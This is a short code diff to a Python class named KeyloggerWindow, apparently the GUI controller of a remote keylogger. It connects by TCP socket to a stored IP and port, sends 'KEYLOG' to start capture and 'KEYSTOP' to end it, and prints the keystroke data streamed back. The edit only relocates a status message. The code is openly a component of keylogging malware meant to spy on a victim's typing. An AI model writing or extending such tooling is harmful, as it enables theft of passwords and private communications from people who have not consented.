@@ -45,10 +45,12 @@ class KeyloggerWindow(Frame):
     def manageEventHook(self):
         threading.Thread(target=self.eventHook).start()
     def eventHook(self):
+
         cmd = "KEYLOG"
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((self.ip, self.port_no))
         self.connection.send(cmd.encode())
+        print("Keylogging started.")
         conn = self.connection
         while True:
             self.data = conn.recv(1024)
@@ -56,7 +58,7 @@ class KeyloggerWindow(Frame):
                 break
             self.result = self.data.decode()
             print(self.data.decode())
-        print("Keylogging started.")
+        
     def eventUnhook(self):
         cmd = "KEYSTOP"
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
